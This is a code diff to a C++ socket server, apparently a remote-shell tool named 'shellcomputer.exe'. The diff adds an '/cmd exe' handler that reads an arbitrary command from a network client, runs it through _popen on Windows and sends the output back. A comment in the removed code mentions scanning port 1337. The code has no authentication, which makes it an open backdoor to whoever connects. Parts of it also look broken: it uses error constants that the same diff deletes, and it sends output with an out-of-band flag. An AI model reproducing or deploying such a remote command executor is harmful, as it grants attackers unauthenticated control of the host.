@@ -1,20 +1,5 @@
 #include "Headers\ServerSocket.h"
 
-static std::string PREFIX_ERROR = "[ERROR] ";
-
-static std::string NULL_COMMAND = (PREFIX_ERROR.append("Command is null\n"));
-static std::string COMMAND_NOT_FOUND = (PREFIX_ERROR.append("Command not found. Use /cmd help\n"));
-static std::string SOCKET_CREATING_ERROR = (PREFIX_ERROR.append("Error creating socket\n"));
-static std::string BIND_FAILED = (PREFIX_ERROR.append("Bind() failed\n"));
-static std::string LISTEN_FAILED = (PREFIX_ERROR.append("Error listening on socket\n"));
-static std::string COMMAND_TOO_LONG = (PREFIX_ERROR.append("Command is too long\n"));
-static std::string HELP = "Usage: shellcomputer.exe <ip> <port> \n Commands: /cmd help, /cmd exe <text>, /cmd list, /cmd checkconn\n";
-static std::string INITIALIZATION_ERROR = (PREFIX_ERROR.append("Initialization error.\n"));
-static std::string COMMAND_EXECUTION_FAIL = (PREFIX_ERROR.append("Execution command fault\n"));
-static std::string SOCKET_DISCONNECT = (PREFIX_ERROR.append("Client disconnected\n"));
-static std::string COMMAND_ACCEPTED = ("Command accepted\n");
-static std::string NULL_CLIENT = (PREFIX_ERROR.append("Client NULL\n"));
-
 ServerSocket::ServerSocket(bool) {}
 
 ServerSocket::ServerSocket(std::string ip, int port) {
@@ -101,7 +86,7 @@ std::string get_address() {
 	return inet_ntoa(addr);
 }
 
-void ServerSocket::exec_cmd(const std::string&& cmd) {
+void ServerSocket::exec_cmd(Socket sock, const char* cmd) {
 #ifdef __linux__
 	FILE* in;
 	char buff[512];
@@ -115,14 +100,21 @@ void ServerSocket::exec_cmd(const std::string&& cmd) {
 	pclose(in);
 #endif
 
-	// EXECUTION CMD -> WINDOWS #TODO
+	// EXECUTION CMD -> WINDOWS
 
+char buffer[128];
+std::string result = "";
+std::shared_ptr<FILE> pipe(_popen(cmd, "r"), _pclose);
+if (!pipe) {
+	throw std::runtime_error(COMMAND_EXECUTION_FAIL);
+}
+while (!feof(pipe.get())) {
+	if (fgets(buffer, 128, pipe.get()) != NULL) {
+		result += buffer;
+	}
 }
 
-void ServerSocket::list_cmd() {
-
-	// SCAN PORTS 1337 or use FILES;)
-
+send(sock, result.c_str(), result.size(), 1);
 }
 
 void ServerSocket::check_connections_cmd(Socket sock, std::vector<std::string>& clients) {
@@ -217,9 +209,9 @@ std::string ServerSocket::parse_header(char* header) {
 std::string ServerSocket::command_exec(Socket client, std::string& cmd) {
 	const std::string help = "help";
 	const std::string exec = "exe";
-	const std::string list = "list";
 	const std::string check_connections = "checkconn";
 	const std::string EXIT = "exit";
+
 	if (cmd.empty()) {
 		error_output(client, COMMAND_NOT_FOUND);
 	}
@@ -235,13 +227,26 @@ std::string ServerSocket::command_exec(Socket client, std::string& cmd) {
 		parse_cmd(client, _cmd);
 		if (_cmd == help) {
 			error_output(client, HELP);
-		}else if (_cmd == list) {
-			list_cmd();
 		}else if (_cmd == check_connections) {
 			check_connections_cmd(client, Client::clients);
-		}else {
+		}
+		else if (_cmd == exec) {
+			char text[256] = { 0 };
+			int recvbytes;
+				recvbytes = recv(client, text, 256, 0);
+				if (recvbytes < 0 || recvbytes > 256) {
+					send(client, INVALID_COMMAND.c_str(), INVALID_COMMAND.size(), 1);
+					memset(text, 0, strlen(text));
+				}
+				else {
+					exec_cmd(client, text);
+				}
+				memset(text, 0, strlen(text));
+			}
+		else {
 			error_output(client, HELP);
 		}
+		
 	}else {
 		error_output(client, COMMAND_NOT_FOUND);
 	}
